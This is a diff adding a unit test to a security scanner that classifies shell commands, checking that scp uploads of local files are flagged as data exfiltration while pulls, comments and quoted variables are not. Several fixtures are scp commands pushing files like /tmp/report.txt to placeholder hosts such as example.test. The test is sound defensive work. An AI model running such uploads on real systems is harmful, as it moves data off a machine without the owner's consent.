@@ -100,6 +100,61 @@ describe("scan", () => {
     }
   });
 
+  it("detects only static local-to-remote SCP pushes as data exfiltration", () => {
+    const pushes = [
+      "scp /tmp/report.txt analyst@example.test:/srv/inbox/report.txt",
+      "sudo scp -P 2222 -i /tmp/test-key ./one.txt ./two.txt user@[2001:db8::10]:/tmp/",
+      "scp -- local.txt scp://user@example.test/tmp/local.txt",
+    ];
+    for (const source of pushes) {
+      const findings = scan(source).findings;
+      expect(findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "exfil.scp-push",
+          category: "data_exfiltration",
+          confidence: "high",
+        }),
+      ]));
+      expect(findings.some((finding) =>
+        finding.ruleId === "exfil.upload"
+      )).toBe(false);
+    }
+
+    const hardNegatives = [
+      "scp analyst@example.test:/srv/report.txt /tmp/report.txt",
+      "scp user@one.example:/a user@two.example:/b",
+      "scp /tmp/one.txt /tmp/two.txt",
+      "scp \"$source\" analyst@example.test:/srv/report.txt",
+      "scp /tmp/report.txt \"$destination\"",
+      "scp --help",
+      "echo 'scp /tmp/report.txt analyst@example.test:/srv/report.txt'",
+      "# scp /tmp/report.txt analyst@example.test:/srv/report.txt",
+    ];
+    for (const source of hardNegatives) {
+      const findings = scan(source).findings;
+      expect(findings.some((finding) =>
+        finding.ruleId === "exfil.scp-push"
+        || finding.ruleId === "exfil.upload"
+      ), source).toBe(false);
+    }
+
+    const readThenPull = scan(`
+      cat /tmp/local-metadata
+      scp analyst@example.test:/srv/report.txt /tmp/report.txt
+    `);
+    expect(readThenPull.findings.some((finding) =>
+      finding.ruleId === "chain.read-upload"
+    )).toBe(false);
+
+    const readThenPush = scan(`
+      cat /tmp/local-report
+      scp /tmp/local-report analyst@example.test:/srv/report.txt
+    `);
+    expect(readThenPush.findings.some((finding) =>
+      finding.ruleId === "chain.read-upload"
+    )).toBe(true);
+  });
+
   it("tracks Python interpreters selected only from trusted discovery candidates", () => {
     const result = scan(`
       which_python=$(which python || which python3 || command -v python3.12)
